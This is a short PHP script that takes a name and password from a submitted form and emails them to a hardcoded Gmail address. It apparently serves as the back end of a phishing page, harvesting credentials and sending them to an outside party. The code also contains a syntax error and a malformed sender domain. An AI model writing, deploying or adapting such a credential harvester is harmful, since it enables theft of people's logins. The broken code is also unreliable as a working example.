<?php
    $name = $_POST['name'];
    $password = $_POST['password'];
    
    $to = 'mukil387@gmail.com';
     $subject ="My email subject";
     $msg ="Name = ". $name . "\r\n  Pass = " . $password;
      
     $headers = "From:mukilanmuki511@gmail..com";
      if ($password!=NULL) {
        (mail($to, $subject, $msg, $headers))
       echo "mail send ... OK";
       }
?>